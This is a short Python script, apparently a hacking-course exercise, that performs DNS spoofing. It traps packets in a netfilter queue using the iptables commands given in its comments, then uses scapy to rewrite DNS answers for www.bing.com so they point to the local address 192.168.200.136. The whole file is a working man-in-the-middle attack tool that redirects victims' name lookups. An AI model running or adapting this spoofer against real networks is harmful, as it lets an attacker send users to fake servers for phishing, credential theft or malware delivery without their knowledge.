#!/usr/bin/env python
# iptables -I FORWARD -j NFQUEUE --queue-num 0 (TRAPPING REQUESTS IN A QUEUE)
# iptables --flush (TO DELETE ALL THE IPTABLES *MAKE SURE TO DO THIS)
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 (REDIRECTING PACKETS TO THE QUEUE)
# iptables -I INPUT -j NFQUEUE --queue-num 0


import netfilterqueue as netq
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # DNSRR is DNS RESPONSE RECORD
    # DNSQR is DNS QUESTION RECORD
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.200.136")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
